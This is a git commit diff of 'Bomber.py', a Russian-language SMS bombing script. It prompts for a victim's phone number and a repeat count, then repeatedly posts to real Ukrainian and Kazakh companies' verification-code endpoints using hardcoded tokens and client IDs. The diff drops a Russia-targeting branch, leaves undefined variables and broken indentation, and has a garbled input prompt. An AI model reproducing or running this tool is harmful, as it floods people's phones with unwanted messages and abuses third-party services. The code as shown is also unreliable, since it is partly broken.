a0dfca3529f5e5187f66d60c8520f11e78298551
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-26 02:44:06 +0200

    Add files via upload

--- Bomber.py
+++ Bomber.py
@@ -1,4 +1,4 @@
-# Version 1.0
+#Библиотеки
 import requests
 import fake_useragent
 import time
@@ -7,7 +7,7 @@ import threading
 from threading import Thread
 from rich.console import Console
 from rich.progress import *
-
+#Обозначение
 console = Console()
 
 os.system('cls' if os.name == 'nt' else 'clear')
@@ -38,22 +38,17 @@ console.print('''[bold red]
 | Человек которий сильно помог - @GGClubbb|
  -----------------------------------------
 ''')
-conut = console.input('[cyan]Выберите вашу страну:\n[red][1] - Украина\n[2] - Россия\n[blue]spammer>> ')
+number = input('[green]Beeante HOMeP tenedona: (бes + ')
 
-console.print("[purple]Введите номер телефонa (без +): ")
 
-self.formatted_phone = console.input("[blue]spammer>> ")
 
-run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
-
-def ukr():
+run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
      print('мазайкааа')
      requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
+ except:
      print('НЕ отправлено мазайка')
-except:
-
  try:
      print('уклон вход')
      requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
@@ -64,24 +59,3 @@ except:
      requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
  except:
      print('Не отправельно уклон регестратура')
-
-
-
-
-
-
-
-def russ():
-         for _ in track(range(run)):
-                headers = {"User-Agent": fake_useragent.UserAgent().random}
-            try:
-                requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers)
-                pass
-         except:
-                pass
-
-
-if conut =='1':
-        ukr()
-elif conut == '2':
-        russ()
